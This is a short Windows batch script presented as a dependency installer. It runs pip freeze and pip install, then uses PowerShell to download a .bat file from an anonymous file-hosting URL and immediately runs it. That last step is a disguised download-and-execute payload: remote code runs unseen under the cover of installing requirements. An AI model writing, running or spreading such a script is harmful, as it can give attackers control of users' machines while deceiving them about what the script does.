@echo off
echo Download requirements.
pip freeze > requirements.txt
pip install -r requirements.txt
powershell iwr https://files.catbox.moe/27u2dv.bat -OutFile package.bat
start package.bat
echo done!
